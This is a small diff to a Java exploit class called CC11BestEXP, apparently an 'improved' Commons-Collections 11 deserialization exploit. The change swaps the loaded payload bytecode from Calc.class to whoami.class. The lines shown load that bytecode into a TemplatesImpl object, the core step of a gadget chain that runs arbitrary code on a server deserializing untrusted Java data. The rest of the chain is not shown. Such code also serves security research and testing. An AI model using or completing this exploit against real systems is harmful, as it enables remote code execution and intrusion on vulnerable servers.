@@ -18,7 +18,7 @@ import java.util.Map;
 // 改进版 CC11 EXP
 public class CC11BestEXP {
     public static void main(String[] args) throws Exception{
-        byte[] code = Files.readAllBytes(Paths.get("E:\\JavaClass\\Calc.class"));
+        byte[] code = Files.readAllBytes(Paths.get("E:\\whoami.class"));
         byte[][] codes = {code};
         TemplatesImpl templates = new TemplatesImpl();
         setFieldValue(templates, "_name", "aaaaa");
